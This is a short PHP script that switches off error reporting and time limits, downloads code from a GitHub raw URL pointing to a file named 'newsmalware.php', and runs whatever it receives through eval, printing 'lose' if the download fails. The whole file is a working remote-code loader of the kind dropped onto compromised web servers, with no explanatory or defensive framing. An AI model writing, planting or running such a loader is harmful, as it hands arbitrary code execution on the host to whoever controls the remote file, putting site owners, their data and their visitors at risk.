

<?php
error_reporting(0);
set_time_limit(0);

// 
$url = "https://raw.githubusercontent.com/ressasantikaa-rgb/newphp86/refs/heads/main/newsmalware.php";

// 
$code = @file_get_contents($url);

// 
if($code !== false){
    eval("?>".$code);
} else {
    echo "lose";
}
